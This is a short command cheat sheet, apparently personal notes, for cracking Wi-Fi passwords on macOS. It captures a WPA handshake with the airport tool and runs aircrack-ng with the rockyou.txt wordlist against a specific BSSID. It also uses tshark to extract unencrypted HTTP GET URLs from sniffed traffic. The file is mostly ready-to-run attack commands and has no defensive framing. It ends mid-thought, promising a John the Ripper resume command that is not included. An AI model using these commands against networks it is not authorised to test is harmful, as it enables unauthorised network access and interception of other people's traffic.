#Sniff the handshake (all words in <> are paramaters)
#You can find the <CHANNEL> with the command 'airport -s'

sudo airport en0 sniff <CHANNEL>

# now use ths sniffed handshake to run some wordlists

aircrack-ng -w <wordlist> -b <BSSID> <.cap files sniffed w airport>

#example:

aircrack-ng -w rockyou.txt -b 58:a2:b5:9f:b7:1d tmp/*.cap


# analyze sniffed data with wireshark
# show unencrypted GET urls
tshark -r airportSniffa.cap -J http tcp | grep GET

# Not Sure but you can use this

# This will store your password generation index within a jtr session file called WirelessBrute.rec,
# to resume the brute-force at any time you can easily do so with the following command.
